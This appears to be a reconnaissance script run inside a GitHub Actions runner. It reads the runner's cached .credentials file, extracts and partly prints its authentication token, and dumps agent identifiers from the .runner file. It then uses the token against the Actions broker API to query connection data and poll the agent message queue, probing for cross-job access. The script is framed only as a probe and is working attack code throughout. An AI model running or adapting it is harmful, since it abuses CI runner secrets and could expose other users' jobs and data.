#!/bin/bash
set -e

echo "=== .credentials file perms and content ==="
CREDS="/home/runner/actions-runner/cached/2.336.0/.credentials"
stat -c "perms=%a owner=%U" "$CREDS" 2>/dev/null || echo "stat_failed"

# Extract token
TOKEN=$(python3 - << 'PYEOF'
import json
d = json.load(open('/home/runner/actions-runner/cached/2.336.0/.credentials'))
t = d.get('Data', {}).get('token', '')
print(t)
PYEOF
)

echo "token_length=${#TOKEN}"
echo "token_prefix=${TOKEN:0:15}"
echo "token_type=$(echo "$TOKEN" | cut -d. -f1)"

echo "=== .runner file ==="
cat /home/runner/actions-runner/cached/2.336.0/.runner 2>/dev/null | python3 -m json.tool | grep -E "ServerUrl|AgentId|PoolId|AgentName"

echo "=== Probe broker.actions.githubusercontent.com ==="
BROKER="https://broker.actions.githubusercontent.com"
curl -sf --max-time 5 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json;api-version=7.1" \
  "$BROKER/_apis/connectionData" 2>&1 | python3 -m json.tool 2>/dev/null | grep -E "deploymentType|instanceType|serverVersion" | head -10 || echo "connectionData_failed"

echo "=== Try agent session message queue (cross-job visibility?) ==="
AGENT_ID=$(python3 -c "import json; print(json.load(open('/home/runner/actions-runner/cached/2.336.0/.runner')).get('AgentId','0'))" 2>/dev/null)
echo "AGENT_ID=$AGENT_ID"
curl -sf --max-time 5 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json;api-version=7.1" \
  "$BROKER/_apis/distributedtask/pools/1/messages?sessionId=test" 2>&1 | head -20 || echo "messages_failed"
